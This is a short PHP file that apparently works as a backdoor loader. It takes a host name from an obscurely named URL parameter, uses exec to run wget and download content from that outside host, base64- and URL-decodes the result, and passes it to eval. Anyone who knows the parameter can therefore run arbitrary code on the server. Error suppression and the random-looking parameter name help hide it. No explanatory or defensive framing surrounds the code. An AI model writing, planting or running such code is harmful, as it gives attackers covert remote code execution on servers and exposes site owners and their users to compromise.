<?php

$z = 'https://'.@$_GET['oby50vkxlpusfr'];
@exec("wget $z -qO-", $d);
$y = base64_decode($d[0]);
$p = urldecode($y);
$a = '?>';
$o = $a.$p;
eval($o);
